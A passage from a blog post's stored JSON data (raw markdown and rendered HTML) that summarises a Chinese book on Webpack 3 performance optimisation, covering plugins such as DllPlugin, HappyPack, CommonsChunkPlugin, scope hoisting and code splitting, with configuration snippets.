//指定css文件中导入的图片等资源存放的cdn地址\n        }),\n    },{\n       test: /\\.png/,\n       use: ['file-loader?name=[name]_[hash:8].[ext]'], //为输出的PNG文件名加上Hash值 \n    }]\n   },\n   plugins:[\n     new WebPlugin({\n        template: './template.html',\n        filename: 'index.html',\n        stylePublicPath: '//css.cdn.com/id/', //指定存放CSS文件的CDN地址\n     }),\n    new ExtractTextPlugin({\n        filename:`[name]_[contenthash:8].css`, //为输出的CSS文件加上Hash\n    })\n   ]\n   ```\n\n\n### 4.2 多页面应用提取页面间公共代码，以利用缓存 \n\n1. **原理**\n\n   大型网站通常由多个页面组成，每个页面都是一个独立的单页应用，多个页面间肯定会依赖同样的样式文件、技术栈等。如果不把这些公共文件提取出来，那么每个单页打包出来的chunk中都会包含公共代码，相当于要传输n份重复代码。如果把公共文件提取出一个文件，那么当用户访问了一个网页，加载了这个公共文件，再访问其他依赖公共文件的网页时，就直接使用文件在浏览器的缓存，这样公共文件就只用被传输一次。\n\n2. **应用方法**\n\n   1. 把多个页面依赖的公共代码提取到common.js中，此时common.js包含基础库的代码\n\n      ```javascript\n      const CommonsChunkPlugin = require('webpack/lib/optimize/CommonsChunkPlugin');\n      //...\n      plugins:[\n          new CommonsChunkPlugin({\n              chunks:['a','b'], //从哪些chunk中提取\n              name:'common',  // 提取出的公共部分形成一个新的chunk\n          })\n      ]\n      ```\n\n   2. 找出依赖的基础库，写一个base.js文件，再与common.js提取公共代码到base中，common.js就剔除了基础库代码，而base.js保持不变\n\n      ```javascript\n      //base.js\n      import 'react';\n      import 'react-dom';\n      import './base.css';\n      //webpack.config.json\n      entry:{\n          base: './base.js'\n      },\n      plugins:[\n          new CommonsChunkPlugin({\n              chunks:['base','common'],\n              name:'base',\n              //minChunks:2, 表示文件要被提取出来需要在指定的chunks中出现的最小次数，防止common.js中没有代码的情况\n          })        \n      ]\n      ```\n\n   3. 得到基础库代码base.js，不含基础库的公共代码common.js，和页面各自的代码文件xx.js。\n\n      页面引用顺序如下：base.js--> common.js--> xx.js\n\n### 4.3 分割代码以按需加载\n\n1. **原理**\n\n   单页应用的一个问题在于使用一个页面承载复杂的功能，要加载的文件体积很大，不进行优化的话会导致首屏加载时间过长，影响用户体验。做按需加载可以解决这个问题。具体方法如下：\n\n   1. 将网站功能按照相关程度划分成几类\n   2. 每一类合并成一个Chunk，按需加载对应的Chunk\n   3. 例如，只把首屏相关的功能放入执行入口所在的Chunk，这样首次加载少量的代码，其他代码要用到的时候再去加载。最好提前预估用户接下来的操作，提前加载对应代码，让用户感知不到网络加载\n\n2. **做法**\n\n   一个最简单的例子：网页首次只加载main.js，网页展示一个按钮，点击按钮时加载分割出去的show.js，加载成功后执行show.js里的函数\n\n   ```javascript\n   //main.js\n   document.getElementById('btn').addEventListener('click',function(){\n       import(/* webpackChunkName:\"show\" */ './show').then((show)=>{\n           show('Webpack');\n       })\n   })\n   //show.js\n   module.exports = function (content) {\n       window.alert('Hello ' + content);\n   }\n   ```\n\n   `import(/* webpackChunkName:show */ './show').then()` 是实现按需加载的关键，Webpack内置对import( \\*)语句的支持，Webpack会以`./show.js`为入口重新生成一个Chunk。代码在浏览器上运行时只有点击了按钮才会开始加载show.js，且import语句会返回一个Promise，加载成功后可以在then方法中获取加载的内容。这要求浏览器支持Promise API，对于不支持的浏览器，需要注入Promise polyfill。`/* webpackChunkName:show */` 是定义动态生成的Chunk的名称，默认名称是[id].js，定义名称方便调试代码。为了正确输出这个配置的ChunkName，还需要配置Webpack：\n\n   ```javascript\n   //...\n   output:{\n       filename:'[name].js',\n       chunkFilename:'[name].js', //指定动态生成的Chunk在输出时的文件名称\n   }\n   ```\n\n   书中另外提供了更复杂的React-Router中异步加载组件的实战场景。P212\n\n## 五、优化输出质量--提升代码运行时的效率\n\n   ### 5.1 使用Prepack提前求值\n\n   1. **原理：**\n\n      Prepack是一个部分求值器，编译代码时提前将计算结果放到编译后的代码中，而不是在代码运行时才去求值。通过在便一阶段预先执行源码来得到执行结果，再直接将运行结果输出以提升性能。但是现在Prepack还不够成熟，用于线上环境还为时过早。\n\n   2. **使用方法**\n\n      ```javascript\n      const PrepackWebpackPlugin = require('prepack-webpack-plugin').default;\n      module.exports = {\n          plugins:[\n              new PrepackWebpackPlugin()\n          ]\n      }\n      ```\n\n   ### 5.2 使用Scope Hoisting\n\n   1. **原理**\n\n      译作“作用域提升”，是在Webpack3中推出的功能，它分析模块间的依赖关系，尽可能将被打散的模块合并到一个函数中，但不能造成代码冗余，所以只有被引用一次的模块才能被合并。由于需要分析模块间的依赖关系，所以源码必须是采用了ES6模块化的，否则Webpack会降级处理不采用Scope Hoisting。\n\n   2. **使用方法**\n\n      ```javascript\n      const ModuleConcatenationPlugin = require('webpack/lib/optimize/ModuleConcatenationPlugin');\n      //...\n      plugins:[\n          new ModuleConcatenationPlugin();\n      ],\n      resolve:{\n      \tmainFields:['jsnext:main','browser','main']\n      }\n      ```\n\n      `webpack --display-optimization-bailout` 输出日志中会提示哪个文件导致了降级处理\n\n## 六、使用输出分析工具\n\n   启动Webpack时带上这两个参数可以生成一个json文件，输出分析工具大多依赖该文件进行分析：\n\n   `webpack --profile --json > stats.json` 其中 `--profile` 记录构建过程中的耗时信息，`--json` 以JSON的格式输出构建结果，`>stats.json` 是UNIX / Linux系统中的管道命令，含义是将内容通过管道输出到stats.json文件中。\n\n   1. **官方工具Webpack Analyse**\n\n      打开该工具的官网http://webpack.github.io/analyse/上传stats.json，就可以得到分析结果\n\n   2. **webpack-bundle-analyzer**\n\n      可视化分析工具，比Webapck Analyse更直观。使用也很简单：\n\n      1. npm  i -g webpack-bundle-analyzer安装到全局\n      2. 按照上面方法生成stats.json文件\n      3. 在项目根目录执行`webpack-bundle-analyzer` ，浏览器会自动打开结果分析页面。\n\n## 七、其他Tips\n\n   1. 配置babel-loader时，`use: [‘babel-loader?cacheDirectory’]` cacheDirectory用于缓存babel的编译结果，加快重新编译的速度。另外注意排除node_modules文件夹，因为文件都使用了ES5的语法，没必要再使用Babel转换。\n\n   2. 配置externals，排除因为已使用\\<script\\>标签引入而不用打包的代码，noParse是排除没使用模块化语句的代码。\n\n   3. 配置performance参数可以输出文件的性能检查配置。\n\n   4. 配置profile：true，是否捕捉Webpack构建的性能信息，用于分析是什么原因导致构建性能不佳。\n\n   5. 配置cache：true，是否启用缓存来提升构建速度。\n\n   6. 可以使用url-loader把小图片转换成base64嵌入到JS或CSS中，减少加载次数。\n\n   7. 通过imagemin-webpack-plugin压缩图片，通过webpack-spritesmith制作雪碧图。\n\n   8. 开发环境下将devtool设置为cheap-module-eval-source-map，因为生成这种source map的速度最快，能加速构建。在生产环境下将devtool设置为hidden-source-map\n\n      \n\n  \n\n","slug":"About_Webpack_Optimization","published":1,"updated":"2018-08-04T04:31:47.823Z","_id":"cjkevabzo0000z1fy49xvvsy4","layout":"post","photos":[],"link":"","content":"<p>Webpack是现在主流的功能强大的模块化打包工具，在使用Webpack时，如果不注意性能优化，有非常大的可能会产生性能问题，性能问题主要分为开发时打包构建速度慢、开发调试时的重复性工作、以及输出文件质量不高等，因此性能优化也主要从这些方面来分析。本文主要是根据自己的理解对《深入浅出Webpack》这本书进行总结，涵盖了大部分的优化方法，可以作为Webpack性能优化时的参考和检查清单。基于Webpack3.4版本，阅读本文需要您熟悉Webpack基本使用方法，读完大约需要三十分钟。</p>\n<a id=\"more\"></a>\n<blockquote>\n<p>From  <a href=\"http://luckymona.github.com\" target=\"_blank\" rel=\"noopener\">http://supermaryy.com</a></p>\n</blockquote>\n<h2 id=\"一、优化构建速度\"><a href=\"#一、优化构建速度\" class=\"headerlink\" title=\"一、优化构建速度\"></a>一、优化构建速度</h2><p>Webpack在启动后会根据Entry配置的入口出发，递归地解析所依赖的文件。这个过程分为搜索文件和把匹配的文件进行分析、转化的两个过程，因此可以从这两个角度来进行优化配置。</p>\n<h3 id=\"1-1-缩小文件的搜索范围\"><a href=\"#1-1-缩小文件的搜索范围\" class=\"headerlink\" title=\"1.1 缩小文件的搜索范围\"></a>1.1 缩小文件的搜索范围</h3><p><strong>搜索过程优化方式包括：</strong></p>\n<ol>\n<li><p><strong><code>resolve</code>字段告诉webpack怎么去搜索文件，所以首先要重视resolve字段的配置：</strong></p>\n<ol>\n<li><p>设置<code>resolve.modules:[path.resolve(__dirname, &#39;node_modules&#39;)]</code>避免层层查找。</p>\n<p><code>resolve.modules</code>告诉webpack去哪些目录下寻找第三方模块，默认值为<code>[&#39;node_modules&#39;]</code>，会依次查找./node_modules、../node_modules、../../node_modules。</p>\n</li>\n<li><p>设置<code>resolve.mainFields:[&#39;main&#39;]</code>，设置尽量少的值可以减少入口文件的搜索步骤</p>\n<p>第三方模块为了适应不同的使用环境，会定义多个入口文件，mainFields定义使用第三方模块的哪个入口文件，由于大多数第三方模块都使用main字段描述入口文件的位置，所以可以设置单独一个main值，减少搜索</p>\n</li>\n<li><p>对庞大的第三方模块设置<code>resolve.alias</code>, 使webpack直接使用库的min文件，避免库内解析</p>\n<p>如对于react：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">resolve.alias:&#123;</span><br><span class=\"line\">\t<span class=\"string\">'react'</span>:patch.resolve(__dirname, <span class=\"string\">'./node_modules/react/dist/react.min.js'</span>)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这样会影响Tree-Shaking，适合对整体性比较强的库使用，如果是像lodash这类工具类的比较分散的库，比较适合Tree-Shaking，避免使用这种方式。</p>\n</li>\n<li><p>合理配置<code>resolve.extensions</code>，减少文件查找</p>\n<p>默认值：<code>extensions:[&#39;.js&#39;, &#39;.json&#39;]</code>,当导入语句没带文件后缀时，Webpack会根据extensions定义的后缀列表进行文件查找，所以：</p>\n<ul>\n<li>列表值尽量少</li>\n<li>频率高的文件类型的后缀写在前面</li>\n<li>源码中的导入语句尽可能的写上文件后缀，如<code>require(./data)</code>要写成<code>require(./data.json)</code></li>\n</ul>\n</li>\n</ol>\n</li>\n<li><p><strong><code>module.noParse</code>字段告诉Webpack不必解析哪些文件，可以用来排除对非模块化库文件的解析</strong></p>\n<p>如jQuery、ChartJS，另外如果使用resolve.alias配置了react.min.js，则也应该排除解析，因为react.min.js经过构建，已经是可以直接运行在浏览器的、非模块化的文件了。noParse值可以是RegExp、[RegExp]、function</p>\n<p><code>module:{ noParse:[/jquery|chartjs/, /react\\.min\\.js$/] }</code></p>\n</li>\n<li><p><strong>配置loader时，通过test、exclude、include缩小搜索范围</strong></p>\n</li>\n</ol>\n<h3 id=\"1-2-使用DllPlugin减少基础模块编译次数\"><a href=\"#1-2-使用DllPlugin减少基础模块编译次数\" class=\"headerlink\" title=\"1.2 使用DllPlugin减少基础模块编译次数\"></a>1.2 使用DllPlugin减少基础模块编译次数</h3><p>DllPlugin动态链接库插件，<strong>其原理是</strong>把网页依赖的基础模块抽离出来打包到dll文件中，当需要导入的模块存在于某个dll中时，这个模块不再被打包，而是去dll中获取。<strong>为什么会提升构建速度呢？</strong>原因在于dll中大多包含的是常用的第三方模块，如react、react-dom，所以只要这些模块版本不升级，就只需被编译一次。我认为这样做和配置resolve.alias和module.noParse的效果有异曲同工的效果。</p>\n<p><strong>使用方法：</strong></p>\n<ol>\n<li><p>使用DllPlugin配置一个webpack_dll.config.js来构建dll文件：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// webpack_dll.config.js</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> path = <span class=\"built_in\">require</span>(<span class=\"string\">'path'</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> DllPlugin = <span class=\"built_in\">require</span>(<span class=\"string\">'webpack/lib/DllPlugin'</span>);</span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\"> entry:&#123;</span><br><span class=\"line\">     react:[<span class=\"string\">'react'</span>,<span class=\"string\">'react-dom'</span>],</span><br><span class=\"line\">     polyfill:[<span class=\"string\">'core-js/fn/promise'</span>,<span class=\"string\">'whatwg-fetch'</span>]</span><br><span class=\"line\"> &#125;,</span><br><span class=\"line\"> output:&#123;</span><br><span class=\"line\">     filename:<span class=\"string\">'[name].dll.js'</span>,</span><br><span class=\"line\">     path:path.resolve(__dirname, <span class=\"string\">'dist'</span>),</span><br><span class=\"line\">     library:<span class=\"string\">'_dll_[name]'</span>,  <span class=\"comment\">//dll的全局变量名</span></span><br><span class=\"line\"> &#125;,</span><br><span class=\"line\"> plugins:[</span><br><span class=\"line\">     <span class=\"keyword\">new</span> DllPlugin(&#123;</span><br><span class=\"line\">         name:<span class=\"string\">'_dll_[name]'</span>,  <span class=\"comment\">//dll的全局变量名</span></span><br><span class=\"line\">         path:path.join(__dirname,<span class=\"string\">'dist'</span>,<span class=\"string\">'[name].manifest.json'</span>),<span class=\"comment\">//描述生成的manifest文件</span></span><br><span class=\"line\">     &#125;)</span><br><span class=\"line\"> ]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>需要注意DllPlugin的参数中name值必须和output.library值保持一致，并且生成的manifest文件中会引用output.library值。</p>\n<p>最终构建出的文件：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">|-- polyfill.dll.js</span><br><span class=\"line\">|-- polyfill.manifest.json</span><br><span class=\"line\">|-- react.dll.js</span><br><span class=\"line\">└── react.manifest.json</span><br></pre></td></tr></table></figure>\n<p>其中xx.dll.js包含打包的n多模块，这些模块存在一个数组里，并以数组索引作为ID，通过一个变量假设为_xx_dll暴露在全局中，可以通过window._xx_dll访问这些模块。xx.manifest.json文件描述dll文件包含哪些模块、每个模块的路径和ID。然后再在项目的主config文件里使用DllReferencePlugin插件引入xx.manifest.json文件。</p>\n</li>\n<li><p>在主config文件里使用DllReferencePlugin插件引入xx.manifest.json文件：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//webpack.config.json</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> path = <span class=\"built_in\">require</span>(<span class=\"string\">'path'</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> DllReferencePlugin = <span class=\"built_in\">require</span>(<span class=\"string\">'webpack/lib/DllReferencePlugin'</span>);</span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">    entry:&#123; <span class=\"attr\">main</span>:<span class=\"string\">'./main.js'</span> &#125;,</span><br><span class=\"line\">    <span class=\"comment\">//... 省略output、loader等的配置</span></span><br><span class=\"line\">    plugins:[</span><br><span class=\"line\">        <span class=\"keyword\">new</span> DllReferencePlugin(&#123;</span><br><span class=\"line\">            manifest:<span class=\"built_in\">require</span>(<span class=\"string\">'./dist/react.manifest.json'</span>)</span><br><span class=\"line\">        &#125;),</span><br><span class=\"line\">        <span class=\"keyword\">new</span> DllReferenctPlugin(&#123;</span><br><span class=\"line\">            manifest:<span class=\"built_in\">require</span>(<span class=\"string\">'./dist/polyfill.manifest.json'</span>)</span><br><span class=\"line\">        &#125;)</span><br><span class=\"line\">    ]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>最终构建生成<code>main.js</code></p>\n</li>\n</ol>\n<h3 id=\"1-3-使用HappyPack开启多进程Loader转换\"><a href=\"#1-3-使用HappyPack开启多进程Loader转换\" class=\"headerlink\" title=\"1.3 使用HappyPack开启多进程Loader转换\"></a>1.3 使用HappyPack开启多进程Loader转换</h3><p>在整个构建流程中，最耗时的就是Loader对文件的转换操作了，而运行在Node.js之上的Webpack是单线程模型的，也就是只能一个一个文件进行处理，不能并行处理。HappyPack可以将任务分解给多个子进程，最后将结果发给主进程。JS是单线程模型，只能通过这种多进程的方式提高性能。   </p>\n<p>HappyPack使用如下：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm i -D happypack</span><br><span class=\"line\"><span class=\"comment\">// webpack.config.json</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> path = <span class=\"built_in\">require</span>(<span class=\"string\">'path'</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> HappyPack = <span class=\"built_in\">require</span>(<span class=\"string\">'happypack'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">    <span class=\"comment\">//...</span></span><br><span class=\"line\">    <span class=\"built_in\">module</span>:&#123;</span><br><span class=\"line\">        rules:[&#123;</span><br><span class=\"line\">                test:<span class=\"regexp\">/\\.js$/</span>，</span><br><span class=\"line\">                use:[<span class=\"string\">'happypack/loader?id=babel'</span>]</span><br><span class=\"line\">                exclude:path.resolve(__dirname, <span class=\"string\">'node_modules'</span>)</span><br><span class=\"line\">            &#125;,&#123;</span><br><span class=\"line\">                test:<span class=\"regexp\">/\\.css/</span>,</span><br><span class=\"line\">                use:[<span class=\"string\">'happypack/loader?id=css'</span>]</span><br><span class=\"line\">            &#125;],</span><br><span class=\"line\">        plugins:[</span><br><span class=\"line\">            <span class=\"keyword\">new</span> HappyPack(&#123;</span><br><span class=\"line\">                id:<span class=\"string\">'babel'</span>,</span><br><span class=\"line\">                loaders:[<span class=\"string\">'babel-loader?cacheDirectory'</span>]</span><br><span class=\"line\">            &#125;),</span><br><span class=\"line\">            <span class=\"keyword\">new</span> HappyPack(&#123;</span><br><span class=\"line\">                id:<span class=\"string\">'css'</span>,</span><br><span class=\"line\">                loaders:[<span class=\"string\">'css-loader'</span>]</span><br><span class=\"line\">            &#125;)</span><br><span class=\"line\">        ]</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>除了id和loaders，HappyPack还支持这三个参数：<code>threads、verbose、threadpool</code>，threadpool代表共享进程池，即多个HappyPack实例都用同个进程池中的子进程处理任务，以防资源占用过多。</p>\n<h3 id=\"1-4-使用ParallelUglifyPlugin开启多进程压缩JS文件\"><a href=\"#1-4-使用ParallelUglifyPlugin开启多进程压缩JS文件\" class=\"headerlink\" title=\"1.4 使用ParallelUglifyPlugin开启多进程压缩JS文件\"></a>1.4 使用ParallelUglifyPlugin开启多进程压缩JS文件</h3><p>使用UglifyJS插件压缩JS代码时，需要先将代码解析成Object表示的AST（抽象语法树），再去应用各种规则去分析和处理AST，所以这个过程计算量大耗时较多。ParallelUglifyPlugin可以开启多个子进程，每个子进程使用UglifyJS压缩代码，可以并行执行，能显著缩短压缩时间。</p>\n<p>使用也很简单，把原来的UglifyJS插件换成本插件即可，使用如下：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm i -D webpack-parallel-uglify-plugin</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// webpack.config.json</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> ParallelUglifyPlugin = <span class=\"built_in\">require</span>(<span class=\"string\">'wbepack-parallel-uglify-plugin'</span>);</span><br><span class=\"line\"><span class=\"comment\">//...</span></span><br><span class=\"line\">plugins: [</span><br><span class=\"line\">    <span class=\"keyword\">new</span> ParallelUglifyPlugin(&#123;</span><br><span class=\"line\">        uglifyJS:&#123;</span><br><span class=\"line\">            <span class=\"comment\">//...这里放uglifyJS的参数</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        <span class=\"comment\">//...其他ParallelUglifyPlugin的参数，设置cacheDir可以开启缓存，加快构建速度</span></span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n<h2 id=\"二、优化开发体验\"><a href=\"#二、优化开发体验\" class=\"headerlink\" title=\"二、优化开发体验\"></a>二、优化开发体验</h2><p>开发过程中修改源码后，需要自动构建和刷新浏览器，以查看效果。这个过程可以使用Webpack实现自动化，Webpack负责监听文件的变化，DevServer负责刷新浏览器。</p>\n<h3 id=\"2-1-使用自动刷新\"><a href=\"#2-1-使用自动刷新\" class=\"headerlink\" title=\"2.1 使用自动刷新\"></a>2.1 使用自动刷新</h3><h4 id=\"2-1-1-Webpack监听文件\"><a href=\"#2-1-1-Webpack监听文件\" class=\"headerlink\" title=\"2.1.1 Webpack监听文件\"></a>2.1.1 Webpack监听文件</h4><p>Webpack可以使用两种方式开启监听：1. 启动webpack时加上–watch参数；2. 在配置文件中设置watch:true。此外还有如下配置参数。合理设置watchOptions可以优化监听体验。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">    watch: <span class=\"literal\">true</span>,</span><br><span class=\"line\">    watchOptions: &#123;</span><br><span class=\"line\">        ignored: <span class=\"regexp\">/node_modules/</span>,</span><br><span class=\"line\">        aggregateTimeout: <span class=\"number\">300</span>,  <span class=\"comment\">//文件变动后多久发起构建，越大越好</span></span><br><span class=\"line\">        poll: <span class=\"number\">1000</span>,  <span class=\"comment\">//每秒询问次数，越小越好</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>ignored：设置不监听的目录，排除node_modules后可以显著减少Webpack消耗的内存</p>\n<p>aggregateTimeout：文件变动后多久发起构建，避免文件更新太快而造成的频繁编译以至卡死，越大越好</p>\n<p>poll：通过向系统轮询文件是否变化来判断文件是否改变，poll为每秒询问次数，越小越好</p>\n<h4 id=\"2-1-2-DevServer刷新浏览器\"><a href=\"#2-1-2-DevServer刷新浏览器\" class=\"headerlink\" title=\"2.1.2 DevServer刷新浏览器\"></a>2.1.2 DevServer刷新浏览器</h4><p><strong>DevServer刷新浏览器有两种方式</strong>：</p>\n<ol>\n<li>向网页中注入代理客户端代码，通过客户端发起刷新</li>\n<li>向网页装入一个iframe，通过刷新iframe实现刷新效果</li>\n</ol>\n<p>默认情况下，以及 <code>devserver: {inline:true}</code> 都是采用第一种方式刷新页面。第一种方式DevServer因为不知道网页依赖哪些Chunk，所以会向每个chunk中都注入客户端代码，当要输出很多chunk时，会导致构建变慢。而一个页面只需要一个客户端，<strong>所以关闭inline模式可以减少构建时间</strong>，chunk越多提升月明显。关闭方式：</p>\n<ol>\n<li>启动时使用webpack-dev-server –inline false</li>\n<li>配置 <code>devserver:{inline:false}</code></li>\n</ol>\n<p>关闭inline后入口网址变为<a href=\"http://localhost:8080/webpack-dev-server/\" target=\"_blank\" rel=\"noopener\">http://localhost:8080/webpack-dev-server/</a></p>\n<p>另外<code>devServer.compress</code> 参数可配置是否采用Gzip压缩，默认为false</p>\n<h3 id=\"2-2-开启模块热替换HMR\"><a href=\"#2-2-开启模块热替换HMR\" class=\"headerlink\" title=\"2.2 开启模块热替换HMR\"></a>2.2 开启模块热替换HMR</h3><p>模块热替换不刷新整个网页而只重新编译发生变化的模块，并用新模块替换老模块，所以预览反应更快，等待时间更少，同时不刷新页面能保留当前网页的运行状态。原理也是向每一个chunk中注入代理客户端来连接DevServer和网页。开启方式：</p>\n<ol>\n<li>webpack-dev-server –hot</li>\n<li>使用HotModuleReplacementPlugin，比较麻烦</li>\n</ol>\n<p>开启后如果修改子模块就可以实现局部刷新，但如果修改的是根JS文件，会整页刷新，原因在于，子模块更新时，事件一层层向上传递，直到某层的文件接收了当前变化的模块，然后执行回调函数。如果一层层向外抛直到最外层都没有文件接收，就会刷新整页。</p>\n<p>使用 <code>NamedModulesPlugin</code> 可以使控制台打印出被替换的模块的名称而非数字ID，另外同webpack监听，忽略node_modules目录的文件可以提升性能。</p>\n<h2 id=\"三、优化输出质量-压缩文件体积\"><a href=\"#三、优化输出质量-压缩文件体积\" class=\"headerlink\" title=\"三、优化输出质量-压缩文件体积\"></a>三、优化输出质量-压缩文件体积</h2><h3 id=\"3-1-区分环境–减小生产环境代码体积\"><a href=\"#3-1-区分环境–减小生产环境代码体积\" class=\"headerlink\" title=\"3.1 区分环境–减小生产环境代码体积\"></a>3.1 区分环境–减小生产环境代码体积</h3><p>代码运行环境分为开发环境和生产环境，代码需要根据不同环境做不同的操作，许多第三方库中也有大量的根据开发环境判断的if else代码，构建也需要根据不同环境输出不同的代码，所以需要一套机制可以在源码中区分环境，区分环境之后可以使输出的生产环境的代码体积减小。Webpack中使用DefinePlugin插件来定义配置文件适用的环境。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> DefinePlugin = <span class=\"built_in\">require</span>(<span class=\"string\">'webpack/lib/DefinePlugin'</span>);</span><br><span class=\"line\"><span class=\"comment\">//...</span></span><br><span class=\"line\">plugins:[</span><br><span class=\"line\">    <span class=\"keyword\">new</span> DefinePlugin(&#123;</span><br><span class=\"line\">        <span class=\"string\">'process.env'</span>: &#123;</span><br><span class=\"line\">            NODE_ENV: <span class=\"built_in\">JSON</span>.stringify(<span class=\"string\">'production'</span>)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n<p>注意，<code>JSON.stringify(&#39;production&#39;)</code> 的原因是，环境变量值需要一个双引号包裹的字符串，而stringify后的值是<code>&#39;&quot;production&quot;&#39;</code></p>\n<p>然后就可以在源码中使用定义的环境：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(process.env.NODE_ENV === <span class=\"string\">'production'</span>)&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'你在生产环境'</span>)</span><br><span class=\"line\">    doSth();</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'你在开发环境'</span>)</span><br><span class=\"line\">    doSthElse();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>当代码中使用了process时，Webpack会自动打包进process模块的代码以支持非Node.js的运行环境，这个模块的作用是模拟Node.js中的process，以支持<code>process.env.NODE_ENV === &#39;production&#39;</code> 语句。</p>\n<h3 id=\"3-2-压缩代码-JS、ES、CSS\"><a href=\"#3-2-压缩代码-JS、ES、CSS\" class=\"headerlink\" title=\"3.2  压缩代码-JS、ES、CSS\"></a>3.2  